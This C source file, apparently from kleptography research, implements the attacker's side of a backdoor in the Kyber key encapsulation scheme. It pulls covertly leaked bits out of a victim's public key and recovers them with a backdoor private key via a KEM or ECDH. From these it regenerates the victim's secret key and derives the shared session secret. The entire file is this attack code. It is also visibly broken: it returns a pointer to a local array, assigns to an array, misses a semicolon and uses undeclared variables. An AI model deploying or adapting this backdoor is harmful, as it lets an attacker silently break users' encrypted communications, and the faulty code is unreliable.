#include "klepto_attack.h"
#include "attack.h"
#include "rng.h"
#include "poly.h"
#include "polyvec.h"
#include "indcpa.h"

uint8_t sec_klepto[crypto_kem_BYTES];

uint8_t* attack_function(uint8_t *sk_bd, uint8_t *pk) {
    uint8_t seed[KYBER_SYMBYTES];
    polyvec pkpv_polyvec;
    polyvec one_matrix[KYBER_K];
    polyvec pkpv_temp;
    polyvec skpvv;
    uint8_t sk_indcpa[KYBER_INDCPA_SECRETKEYBYTES];
    int i;

    uint16_t u_decompressed_coeffs[KYBER_K*KYBER_N];

    unpack_pk(&pkpv_polyvec, seed, pk);

    for(int ii = 0; ii < KYBER_K; ii++)
    {
      for(int jj = 0; jj < KYBER_K; jj++)
      {
        for(int kk = 0; kk < KYBER_N; kk++)
        {
          if((ii == jj) && (kk%2) == 0)
            one_matrix[ii].vec[jj].coeffs[kk] = 1;
          else
            one_matrix[ii].vec[jj].coeffs[kk] = 0;
        }
      }
    }


    for(i=0;i<KYBER_K;i++)
      polyvec_basemul_acc_montgomery(&pkpv_temp.vec[i], &pkpv_polyvec, &(one_matrix[i]));

    polyvec_invntt_tomont(&pkpv_temp);

    int value_now, mod_value_now;
    int current_coeff_pos;
    int bit_pos, byte_pos;

    uchar *klepto_data_in_attacker;
    klepto_data_in_attacker = (uchar *) malloc(klepto_data_to_send_len_global);

    for(int kk = 0; kk < klepto_data_to_send_len_global; kk++)
    {
      klepto_data_in_attacker[kk] = 0x00;
    }

    uint8_t klepto_data_in_attacker_in_bits[klepto_data_to_send_len_global*8];

    for(int ii = 0; ii < KYBER_K; ii++)
    {
      for(int jj = 0; jj < KYBER_N; jj++)
      {
        current_coeff_pos = KYBER_N*ii+jj;
        byte_pos = (int)(current_coeff_pos*(KLEPTO_BITS_PER_COEFF)/8);
        bit_pos = (current_coeff_pos*KLEPTO_BITS_PER_COEFF)%8;

        if((current_coeff_pos*KLEPTO_BITS_PER_COEFF) < (klepto_data_to_send_len_global*8))
        {
          if(pkpv_temp.vec[ii].coeffs[jj] < 0)
            value_now = pkpv_temp.vec[ii].coeffs[jj] + KYBER_Q;
          else
            value_now = pkpv_temp.vec[ii].coeffs[jj];

          mod_value_now = value_now % (1 << KLEPTO_BITS_PER_COEFF);

          int bittt;
          for(int klk = 0; klk < KLEPTO_BITS_PER_COEFF; klk++)
            klepto_data_in_attacker_in_bits[current_coeff_pos*KLEPTO_BITS_PER_COEFF + klk] = (mod_value_now >> klk)&0x1;

        }
      }
    }

    for(int klk = 0; klk < klepto_data_to_send_len_global; klk++)
    {
      int bytte_now = 0;
      for(int qwq = 0; qwq < 8; qwq++)
        bytte_now = bytte_now | ((klepto_data_in_attacker_in_bits[klk*8+qwq]) << qwq);

      klepto_data_in_attacker[klk] = bytte_now;
    }

    #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)
    for(int kk = 0; kk < crypto_kem_CIPHERTEXTBYTES; kk++)
    {
      ct_bd[kk] = *(klepto_data_in_attacker + kk);
    }

    cm_crypto_kem_dec(sec_klepto, ct_bd, sk_bd);  // Dec_bd(sk_bd, ct_bd), sec_klepto = m'

    #else
    uint8_t ecc_public_key_klepto[ECC_PUB_KEY_SIZE];

    for(int kk = 0; kk < ECC_PUB_KEY_SIZE; kk++)
    {
      ecc_public_key_klepto[kk] = *(klepto_data_in_attacker + kk);
    }

    // Get the Public key and extract the information from this...

    ecdh_shared_secret(prv_ecdh_attacker, ecc_public_key_klepto, sec_klepto);
    #endif

    // Recover secret from m'_bd
    uint8_t recovery_seed[KYBER_SYMBYTES];
    uint8_t nonce = 0;

    for(int kk = 0; kk < 32; kk++)
    {
      *(recovery_seed+kk) = *(sec_klepto+kk);
    }
    
    for(i=0;i<KYBER_K;i++)
      poly_getnoise_eta1(&skpvv.vec[i], recovery_seed, nonce++);

    polyvec_ntt(&skpvv);

    pack_sk(sk_indcpa, &skpv);

    return sk_indcpa;
}

void read_key_from_file(const char *filename, uint8_t *key, size_t len) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        fprintf(stderr, "Failed to open file %s for reading\n", filename);
        exit(EXIT_FAILURE);
    }
    size_t read = fread(key, sizeof(uint8_t), len, file);
    if (read != len) {
        fprintf(stderr, "Failed to read the complete key from file %s\n", filename);
        exit(EXIT_FAILURE);
    }
    fclose(file);
}

void write_key_to_file(const char *filename, uint8_t *key, size_t len) {
    FILE *file = fopen(filename, "wb");
    if (file == NULL) {
        fprintf(stderr, "Failed to open file %s for writing\n", filename);
        exit(EXIT_FAILURE);
    }
    fwrite(key, sizeof(uint8_t), len, file);
    fclose(file);
}

int main() {
  uint8_t sk_off[crypto_kem_SECRETKEYBYTES];
  uint8_t sk_indcpa[KYBER_INDCPA_SECRETKEYBYTES];
  uint8_t kr[2*KYBER_SYMBYTES];
  uint8_t secret_key[KYBER_SYMBYTES];
  read_key_from_file("../KEYS/privatekey.bin", sk_off, crypto_kem_SECRETKEYBYTES);
  sk_indcpa = attack_function(sk_off, pk);

  uint8_t buf[KYBER_SYMBYTES+KYBER_SYMBYTES];
  indcpa_dec(buf, ct, sk_indcpa);

  hash_h(buf+KYBER_SYMBYTES, pk, KYBER_PUBLICKEYBYTES)     // H(pk)
  hash_g(kr, buf, 2*KYBER_SYMBYTES);     // (K_bar', r') <- G(m' || H(pk))

  for (int i=0; i<KYBER_SYMBYTES; i++) {
    *(secret_key+i) = *(kr+i); 
  }

  write_key_to_file("../KEYS/secret_key.bin", secret_key, KYBER_SYMBYTES);
  return 0;
}
